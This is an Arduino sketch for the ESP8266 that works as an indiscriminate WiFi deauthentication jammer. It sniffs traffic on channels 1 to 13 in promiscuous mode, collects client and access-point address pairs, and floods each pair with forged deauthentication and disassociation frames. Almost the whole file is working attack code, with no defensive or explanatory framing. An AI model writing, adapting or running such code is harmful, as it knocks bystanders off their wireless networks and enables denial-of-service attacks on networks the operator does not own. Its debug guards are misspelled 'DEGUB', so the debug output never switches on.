#include <Arduino.h>
#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

//#define DEBUG

bool compare_bssid(uint8_t *bssid1, uint8_t *bssid2);
void set_bssid(uint8_t *bssid1, uint8_t *bssid2);
void sniffer(uint8_t *buf, uint16_t len);

uint8_t ZERO_MAC[]={0,0,0,0,0,0};
uint8_t BROAD_MAC[]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
uint8_t deauth_packet[26] = {
  0x00, 0x00,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x01, 0x00
};
class WiFiClientFound {
  public:
    uint8_t BSSID1[6];
    uint8_t BSSID2[6];
  WiFiClientFound(uint8_t *bssid1=ZERO_MAC, uint8_t *bssid2=ZERO_MAC){
    set_bssid(BSSID1,bssid1);
    set_bssid(BSSID2,bssid2);
  }
};

void deauth(WiFiClientFound c);



const int MAX_CLIENTS=100;
WiFiClientFound clients[MAX_CLIENTS];
int clients_num=0;
int current_channel=1;


void deauth(WiFiClientFound c){
  #ifdef DEGUB
  Serial.print("Deauthing ");
  print_bssid(c.BSSID1);
  Serial.print(" - ");
  print_bssid(c.BSSID2);
  Serial.println(" !!");
  #endif
  for(int i=0;i<6;i++){
    deauth_packet[4+i]=c.BSSID1[i];
  }
  for(int i=0;i<6;i++){
    deauth_packet[10+i]=deauth_packet[16+i]=c.BSSID2[i];
  }
  deauth_packet[0]=0xA0;
  wifi_send_pkt_freedom(deauth_packet, 26, 0);
  deauth_packet[0]=0xC0;
  wifi_send_pkt_freedom(deauth_packet, 26, 0);
  
  for(int i=0;i<6;i++){
    deauth_packet[4+i]=c.BSSID2[i];
  }
  for(int i=0;i<6;i++){
    deauth_packet[10+i]=deauth_packet[16+i]=c.BSSID1[i];
  }
  deauth_packet[0]=0xA0;
  wifi_send_pkt_freedom(deauth_packet, 26, 0);
  deauth_packet[0]=0xC0;
  wifi_send_pkt_freedom(deauth_packet, 26, 0);
}

bool compare_bssid(uint8_t *bssid1, uint8_t *bssid2){
  for(int i=0;i<6;i++){
    if(bssid1[i]!=bssid2[i]){
      return false;
    }
  }
  return true;
}

void set_bssid(uint8_t *bssid1, uint8_t *bssid2){
  for(int i=0;i<6;i++){
    bssid1[i]=bssid2[i];
  }
}

void print_bssid(uint8_t *bssid1){
  #ifdef DEGUB
  for(int i=0;i<6;i++){
    if(bssid1[i]<0x10){
      Serial.print(0);
    }
    Serial.print(bssid1[i],HEX);
    if(i<5){
      Serial.print(":");
    }
  }
  #endif
}
void sniffer(uint8_t *buf, uint16_t len){
  if(len>27){
    uint8_t bssid1[]={buf[16],buf[17],buf[18],buf[19],buf[20],buf[21]};
    uint8_t bssid2[]={buf[22],buf[23],buf[24],buf[25],buf[26],buf[27]};
    bool got_already=false;
    if(compare_bssid(bssid1,ZERO_MAC)){
      got_already=true;
    }
    for(int i=0;i<clients_num;i++){
      if(got_already){
        break;
      }
      if((compare_bssid(bssid1,clients[i].BSSID1)&&compare_bssid(bssid2,clients[i].BSSID2))||(compare_bssid(bssid2,clients[i].BSSID2)&&compare_bssid(bssid1,clients[i].BSSID1))){
        got_already=true;
      }
    }
    if(!got_already){
      #ifdef DEGUB
      print_bssid(bssid1);
      Serial.print(" - ");
      print_bssid(bssid2);
      Serial.println();
      #endif
      set_bssid(clients[clients_num].BSSID1,bssid1);
      set_bssid(clients[clients_num].BSSID2,bssid2);
      clients_num++;
      if(clients_num>=MAX_CLIENTS){
        clients_num=0;
      }
    }
    
  }
}


void setup() {
  #ifdef DEGUB
  Serial.begin(115200);
  #endif
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(sniffer);
  #ifdef DEGUB
  Serial.println();
  Serial.println("Ready !");
  #endif
}

void loop() {
  wifi_set_channel(current_channel);
  for(int i=0;i<clients_num;i++){
    deauth(clients[i]);
  }
  delay(50);
  current_channel++;
  if(current_channel>13){
    current_channel=1;
  }
  
}
